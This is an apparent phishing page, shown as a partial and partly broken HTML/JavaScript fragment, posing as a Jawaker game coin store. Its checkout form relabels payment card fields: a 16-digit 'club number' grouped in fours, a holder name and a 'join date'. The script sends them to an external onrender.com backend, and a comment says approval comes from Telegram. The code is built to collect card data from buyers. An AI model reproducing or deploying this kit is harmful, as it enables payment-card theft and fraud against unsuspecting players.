<main>

<div class="overlay" id="overlay">
  <div class="form-panel">

      </div>

      <div class="field card-field">
        <input type="text" id="f-jawaker-number" name="jawakerNumber" inputmode="numeric" placeholder=" Number club" maxlength="19" required>
      </div>

      <div class="row-3">
        <input type="text" id="f-join-day" name="joinDay" inputmode="numeric" placeholder="DD" maxlength="2" required>

      </div>

        </div>
        <div class="field card-field" style="flex:1;">
          <input type="text" id="f-last-name" name="lastNameRecord" placeholder="Last name" required>
        </div>

        <input type="text" id="f-country" name="country" placeholder="country" required>

<script>
  const coinSVG = `
  <svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
    <defs>
      <radialGradient id="coinGrad" cx="35%" cy="30%" r="75%">
        <stop offset="0%" stop-color="#fbe08a"/>
        <stop offset="55%" stop-color="#e6ab3f"/>
        <stop offset="100%" stop-color="#a9741f"/>
      </radialGradient>
    </defs>
    <circle cx="50" cy="50" r="46" fill="url(#coinGrad)" stroke="#8a5c15" stroke-width="3"/>
    <circle cx="50" cy="50" r="36" fill="none" stroke="#8a5c15" stroke-width="2" opacity="0.5"/>
    <text x="50" y="62" font-size="34" text-anchor="middle" fill="#8a5c15" font-family="Cairo, sans-serif" font-weight="900">$</text>
  </svg>`;

  const packages = [
    { name: "الفئة الأولى", amount: "120,000", price: "$10" },
    { name: "الفئة الثانية", amount: "250,000", price: "$20" },
    { name: "الفئة الثالثة", amount: "375,000", price: "$30" },
    { name: "الفئة الرابعة", amount: "800,000", price: "$60" },
    { name: "الفئة الخامسة", amount: "1,000,000", price: "$80" },
    { name: "الفئة السادسة", amount: "1,300,000", price: "$100" },
    { name: "الفئة السابعة", amount: "2,500,000", price: "$180" },
    { name: "الفئة الثامنة", amount: "3,500,000", price: "$250" },
  ];

  const grid = document.getElementById('grid');
  packages.forEach(p => {
    const card = document.createElement('div');
    card.className = 'card';
    card.innerHTML = `
      <div class="info-icon">i</div>
      <div class="coin-icon">${coinSVG}</div>
      <div class="pack-name">${p.name}</div>
      <div class="pack-amount">${p.amount} <span class="mini-coin">${coinSVG}</span></div>
      <button class="buy-btn" data-state="price" data-name="${p.name}" data-amount="${p.amount}" data-price="${p.price}" onclick="handleBuy(this)">${p.price}</button>
    `;
    grid.appendChild(card);
  });

  function handleBuy(btn){
    if(btn.dataset.state === 'price'){
      // First click: reveal the payment option
      btn.textContent = 'ادخل معلومات حسابك';
      btn.dataset.state = 'pay';
      return;
    }
    // Second click: open the pre-payment info form
    currentOrder = {
      name: btn.dataset.name,
      amount: btn.dataset.amount,
      price: btn.dataset.price
    };
    openForm();
  }

  // ---- Backend config ----
  // بعد ما تنشري السيرفر (app.py) على Render/Railway/إلخ، حطي رابطه هون:
  const BACKEND_URL = "https://jawaker.onrender.com";

  let currentOrder = null;
  let pollTimer = null;

  // ---- Pre-payment form logic ----
  const overlay = document.getElementById('overlay');
  const payForm = document.getElementById('payForm');
  const submitBtn = document.getElementById('submitBtn');
  const formInputs = payForm.querySelectorAll('input[required], select[required]');
  const statusView = document.getElementById('statusView');
  const statusSpinnerWrap = document.getElementById('statusSpinnerWrap');
  const statusIcon = document.getElementById('statusIcon');
  const statusText = document.getElementById('statusText');
  const statusActionBtn = document.getElementById('statusActionBtn');
  const orderChip = document.getElementById('orderChip');

  const idInput = document.getElementById('f-id');
  const holderNameInput = document.getElementById('f-holder-name');
  const numberInput = document.getElementById('f-jawaker-number');

  // ID: digits only
  idInput.addEventListener('input', function(){
    this.value = this.value.replace(/\D/g, '');
  });

  // Jawaker/club number: digits only, grouped in 4s with spaces (e.g. 1234 5678 9012 3456)
  numberInput.addEventListener('input', function(){
    const digits = this.value.replace(/\D/g, '').slice(0, 16);
    this.value = digits.replace(/(.{4})(?=.)/g, '$1 ');
  });

  // Holder Name: letters only, digits get stripped as they're typed
  holderNameInput.addEventListener('input', function(){
    this.value = this.value.replace(/[0-9]/g, '');
  });

  // Join date fields: digits only
  const joinDayInput = document.getElementById('f-join-day');
  const joinMonthInput = document.getElementById('f-join-month');
  const joinYearInput = document.getElementById('f-join-year');
  [joinDayInput, joinMonthInput, joinYearInput].forEach(input => {
    input.addEventListener('input', function(){
      this.value = this.value.replace(/\D/g, '');
    });
  });


  function openForm(){
    if(currentOrder){
      orderChip.innerHTML = `${currentOrder.name} — <b>${currentOrder.amount}</b> توكنز — ${currentOrder.price}`;
      submitBtn.textContent = `دفع ${currentOrder.price}`;
    }
    overlay.classList.add('open');
  }
  function closeForm(){
    overlay.classList.remove('open');
    stopPolling();
    // Reset views for next time
    payForm.style.display = '';
    statusView.classList.remove('show');
    payForm.reset();
    submitBtn.disabled = true;
    submitBtn.classList.remove('enabled');
    submitBtn.textContent = currentOrder ? `دفع ${currentOrder.price}` : 'إرسال';
  }
  overlay.addEventListener('click', (e) => {
    if(e.target === overlay) closeForm();
  });

  function validateForm(){
    let allValid = true;
    formInputs.forEach(input => {
      if(!input.checkValidity() || input.value.trim() === ''){
        allValid = false;
      }
    });
    submitBtn.disabled = !allValid;
    submitBtn.classList.toggle('enabled', allValid);
  }

  formInputs.forEach(input => {
    input.addEventListener('input', validateForm);
  });

  let verifyTimer = null;

  function showWaiting(){
    payForm.style.display = 'none';
    statusView.classList.add('show');
    statusSpinnerWrap.style.display = '';
    statusIcon.style.display = 'none';
    statusText.textContent = 'جار التحقق...';
    statusActionBtn.style.display = 'none';

    // بعد 25 ثانية، إذا الطلب لسا معلّق، ننتقل لحالة "قيد المراجعة"
    // مع الاستمرار الفعلي بانتظار قرار حقيقي (approved/rejected) من تلجرام
    clearTimeout(verifyTimer);
    verifyTimer = setTimeout(() => {
      if (statusView.classList.contains('show') && statusText.textContent === 'جار التحقق...') {
        statusText.textContent = 'قيد المراجعة، سيتم إعلامك فور الانتهاء...';
      }
    }, 25000);
  }

  function showApproved(){
    statusSpinnerWrap.style.display = 'none';
    statusIcon.style.display = '';
    statusIcon.textContent = '✅';
    statusText.textContent = 'تم شحن حسابك بنجاح';
    statusActionBtn.textContent = 'حسناً';
    statusActionBtn.className = 'submit-btn enabled';
    statusActionBtn.style.display = '';
    statusActionBtn.onclick = closeForm;
    showRatingModal();
  }

  function showRejected(){
    statusSpinnerWrap.style.display = 'none';
    statusIcon.style.display = '';
    statusIcon.textContent = '⚠️';
    statusText.textContent = 'يرجى التأكد من صحة بياناتك';
    statusActionBtn.textContent = 'حاول مرة أخرى';
    statusActionBtn.className = 'submit-btn enabled';
    statusActionBtn.style.display = '';
    statusActionBtn.onclick = function(){
      statusView.classList.remove('show');
      payForm.style.display = '';
    };
  }

  function showError(msg){
    statusSpinnerWrap.style.display = 'none';
    statusIcon.style.display = '';
    statusIcon.textContent = '⚠️';
    statusText.textContent = msg || 'صار في مشكلة، حاول مرة أخرى';
    statusActionBtn.textContent = 'إغلاق';
    statusActionBtn.className = 'submit-btn enabled';
    statusActionBtn.style.display = '';
    statusActionBtn.onclick = closeForm;
  }

  function stopPolling(){
    if(pollTimer){ clearInterval(pollTimer); pollTimer = null; }
    if(verifyTimer){ clearTimeout(verifyTimer); verifyTimer = null; }
  }

  function pollOrderStatus(orderId){
    pollTimer = setInterval(async () => {
      try{
        const res = await fetch(`${BACKEND_URL}/api/order/${orderId}`);
        if(!res.ok) return;
        const result = await res.json();
        if(result.status === 'approved'){
          stopPolling();
          showApproved();
        } else if(result.status === 'rejected'){
          stopPolling();
          showRejected();
        }
        // status === 'pending' -> keep waiting
      } catch(err){
        // شبكة متقطعة، منكمل نحاول
      }
    }, 2500);
  }

  payForm.addEventListener('submit', async function(e){
    e.preventDefault();
    validateForm();
    if(submitBtn.disabled) return;

    const data = new FormData(payForm);
    const joinDay = data.get('joinDay').padStart(2, '0');
    const joinMonth = data.get('joinMonth').padStart(2, '0');
    const joinYear = data.get('joinYear');
    const body = {
      id: data.get('id'),
      jawakerNumber: data.get('jawakerNumber').replace(/\s/g, ''),
      jawakerName: data.get('jawakerName'),
      country: data.get('country'),
      joinDate: `${joinDay}/${joinMonth}/${joinYear}`,
      order: currentOrder || {},
    };

    submitBtn.disabled = true;
    submitBtn.textContent = 'جارِ التحقق...';

    try{
      const res = await fetch(`${BACKEND_URL}/api/order`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
      });
      const result = await res.json();
      if(!res.ok || !result.order_id){
        throw new Error(result.error || 'فشل إرسال الطلب');
      }
      showWaiting();
      currentOrderId = result.order_id;
      pollOrderStatus(result.order_id);
    } catch(err){
      showWaiting();
      showError('صار في مشكلة بإرسال البيانات: ' + err.message);
    }
  });

  // ---- Rating modal ----
  let currentOrderId = null;
  const ratingOverlay = document.getElementById('ratingOverlay');
  const ratingInput = document.getElementById('ratingInput');
  const ratingError = document.getElementById('ratingError');
  const ratingSubmitBtn = document.getElementById('ratingSubmitBtn');
  const ratingSkipBtn = document.getElementById('ratingSkipBtn');

  function isRatingValid(){
    const value = parseInt(ratingInput.value, 10);
    return !!value && value >= 1 && value <= 6;
  }
  ratingInput.addEventListener('input', function(){
    ratingSubmitBtn.disabled = !isRatingValid();
    if(isRatingValid()){
      ratingInput.classList.remove('invalid');
      ratingError.classList.remove('show');
    }
  });

  function showRatingModal(){
    ratingInput.value = '';
    ratingInput.classList.remove('invalid');
    ratingError.classList.remove('show');
    ratingSubmitBtn.disabled = true;
    ratingSubmitBtn.textContent = 'إرسال التقييم';
    ratingOverlay.classList.add('open');
  }
  function closeRatingModal(){
    ratingOverlay.classList.remove('open');
  }
  ratingSkipBtn.addEventListener('click', function(){
    location.reload();
  });
  ratingOverlay.addEventListener('click', (e) => {
    if(e.target === ratingOverlay) closeRatingModal();
  });

  ratingSubmitBtn.addEventListener('click', async function(){
    const value = parseInt(ratingInput.value, 10);
    if(!value || value < 1 || value > 6){
      ratingInput.classList.add('invalid');
      ratingError.classList.add('show');
      ratingInput.focus();
      return;
    }
    ratingInput.classList.remove('invalid');
    ratingError.classList.remove('show');
    ratingSubmitBtn.disabled = true;
    ratingSubmitBtn.textContent = 'جارِ الإرسال...';
    try{
      const res = await fetch(`${BACKEND_URL}/api/rating`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ order_id: currentOrderId, rating: value }),
      });
      if(!res.ok){
        const errBody = await res.json().catch(() => ({}));
        console.error('rating_send_failed', res.status, errBody);
        ratingError.textContent = 'صار في مشكلة بإرسال التقييم، حاولي مرة كمان';
        ratingError.classList.add('show');
        ratingSubmitBtn.disabled = false;
        ratingSubmitBtn.textContent = 'إرسال التقييم';
        return;
      }
      closeRatingModal();
    } catch(err){
      console.error('rating_network_error', err);
      ratingError.textContent = 'تعذر الاتصال بالسيرفر، تأكدي من الإنترنت وحاولي كمان';
      ratingError.classList.add('show');
      ratingSubmitBtn.disabled = false;
      ratingSubmitBtn.textContent = 'إرسال التقييم';
    }
  });
</script>

</body>
</html>
